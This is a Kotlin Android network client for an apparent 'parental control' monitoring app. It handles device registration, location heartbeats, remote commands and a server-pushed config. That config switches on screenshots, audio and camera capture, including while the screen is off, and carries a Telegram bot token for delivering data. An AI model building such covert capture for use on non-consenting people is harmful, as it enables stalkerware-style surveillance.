package com.example.telegramsender.network

import android.os.Build
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object ApiClient {
    private const val TAG = "ApiClient"
    const val BASE_URL = "https://parental-web-dash.vercel.app"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    data class RegisterResult(
        val success: Boolean,
        val deviceId: String? = null,
        val deviceToken: String? = null,
        val deviceJwt: String? = null,
        val syncIntervalMinutes: Long = 15,
        val errorMessage: String? = null
    )

    data class SyncConfigDto(
        val syncIntervalMinutes: Long = 15,
        val telegramBotToken: String = "",
        val telegramChatId: String = "",
        val isMonitoringActive: Boolean = true,
        val sendScreenshot: Boolean = true,
        val screenshotInterval: Long = 10,
        val sendLocation: Boolean = true,
        val locationInterval: Long = 10,
        val sendAudio: Boolean = false,
        val audioDuration: Long = 60,
        val audioScreenOff: Boolean = false,
        val sendCamera: Boolean = false,
        val cameraInterval: Long = 10,
        val cameraScreenOff: Boolean = false
    )

    data class SyncResult(
        val success: Boolean,
        val isLocked: Boolean = false,
        val lockMessage: String = "Device is locked by parental control.",
        val config: SyncConfigDto = SyncConfigDto(),
        val pendingCommands: List<CommandDto> = emptyList(),
        val errorMessage: String? = null
    )

    data class CommandDto(
        val id: String,
        val type: String,
        val params: JSONObject?
    )

    /**
     * One-time device registration / pairing with parent's account
     */
    fun registerDevice(
        email: String,
        password: String,
        deviceName: String = "${Build.MANUFACTURER} ${Build.MODEL}",
        deviceModel: String = Build.MODEL,
        appVersion: String = "1.0.0"
    ): RegisterResult {
        return try {
            val json = JSONObject().apply {
                put("email", email.trim())
                put("password", password)
                put("deviceName", deviceName)
                put("deviceModel", deviceModel)
                put("appVersion", appVersion)
            }

            val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
            val request = Request.Builder()
                .url("$BASE_URL/api/device/register")
                .post(body)
                .build()

            client.newCall(request).execute().use { response ->
                val responseBody = response.body?.string() ?: ""
                if (response.isSuccessful) {
                    val resJson = JSONObject(responseBody)
                    val deviceId = resJson.optString("deviceId")
                    val deviceToken = resJson.optString("deviceToken")
                    val deviceJwt = resJson.optString("deviceJwt")
                    val config = resJson.optJSONObject("config")
                    val interval = config?.optLong("syncIntervalMinutes", 15L) ?: 15L

                    RegisterResult(
                        success = true,
                        deviceId = deviceId,
                        deviceToken = deviceToken,
                        deviceJwt = deviceJwt,
                        syncIntervalMinutes = interval
                    )
                } else {
                    val errJson = try { JSONObject(responseBody) } catch (e: Exception) { null }
                    val err = errJson?.optString("error") ?: "Registration failed: HTTP ${response.code}"
                    RegisterResult(success = false, errorMessage = err)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Registration exception", e)
            RegisterResult(success = false, errorMessage = e.message ?: "Network error")
        }
    }

    /**
     * Lightweight Periodic Device Sync (Heartbeat)
     */
    fun syncDevice(
        deviceJwt: String,
        batteryLevel: Int,
        isCharging: Boolean,
        latitude: Double? = null,
        longitude: Double? = null,
        accuracy: Float? = null,
        executedCommandIds: List<String> = emptyList(),
        appVersion: String = "1.0.0"
    ): SyncResult {
        return try {
            val json = JSONObject().apply {
                put("batteryLevel", batteryLevel)
                put("isCharging", isCharging)
                put("appVersion", appVersion)

                if (latitude != null && longitude != null) {
                    val locJson = JSONObject().apply {
                        put("latitude", latitude)
                        put("longitude", longitude)
                        if (accuracy != null) put("accuracy", accuracy.toDouble())
                        put("timestamp", System.currentTimeMillis())
                    }
                    put("location", locJson)
                }

                if (executedCommandIds.isNotEmpty()) {
                    val arr = JSONArray()
                    executedCommandIds.forEach { arr.put(it) }
                    put("executedCommandIds", arr)
                }
            }

            val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
            val request = Request.Builder()
                .url("$BASE_URL/api/device/sync")
                .addHeader("Authorization", "Bearer $deviceJwt")
                .post(body)
                .build()

            client.newCall(request).execute().use { response ->
                val responseBody = response.body?.string() ?: ""
                if (response.isSuccessful) {
                    val resJson = JSONObject(responseBody)
                    val isLocked = resJson.optBoolean("isLocked", false)
                    val lockMessage = resJson.optString("lockMessage", "Device is locked by parental control.")
                    val configJson = resJson.optJSONObject("config")

                    val config = SyncConfigDto(
                        syncIntervalMinutes = configJson?.optLong("syncIntervalMinutes", 15L) ?: 15L,
                        telegramBotToken = configJson?.optString("telegramBotToken", "") ?: "",
                        telegramChatId = configJson?.optString("telegramChatId", "") ?: "",
                        isMonitoringActive = configJson?.optBoolean("isMonitoringActive", true) ?: true,
                        sendScreenshot = configJson?.optBoolean("sendScreenshot", true) ?: true,
                        screenshotInterval = configJson?.optLong("screenshotInterval", 10L) ?: 10L,
                        sendLocation = configJson?.optBoolean("sendLocation", true) ?: true,
                        locationInterval = configJson?.optLong("locationInterval", 10L) ?: 10L,
                        sendAudio = configJson?.optBoolean("sendAudio", false) ?: false,
                        audioDuration = configJson?.optLong("audioDuration", 60L) ?: 60L,
                        audioScreenOff = configJson?.optBoolean("audioScreenOff", false) ?: false,
                        sendCamera = configJson?.optBoolean("sendCamera", false) ?: false,
                        cameraInterval = configJson?.optLong("cameraInterval", 10L) ?: 10L,
                        cameraScreenOff = configJson?.optBoolean("cameraScreenOff", false) ?: false
                    )

                    val commandsList = mutableListOf<CommandDto>()
                    val cmdsArr = resJson.optJSONArray("pendingCommands")
                    if (cmdsArr != null) {
                        for (i in 0 until cmdsArr.length()) {
                            val c = cmdsArr.getJSONObject(i)
                            commandsList.add(
                                CommandDto(
                                    id = c.getString("id"),
                                    type = c.getString("type"),
                                    params = c.optJSONObject("params")
                                )
                            )
                        }
                    }

                    SyncResult(
                        success = true,
                        isLocked = isLocked,
                        lockMessage = lockMessage,
                        config = config,
                        pendingCommands = commandsList
                    )
                } else {
                    SyncResult(success = false, errorMessage = "Sync failed: HTTP ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Sync error", e)
            SyncResult(success = false, errorMessage = e.message ?: "Sync network exception")
        }
    }
}
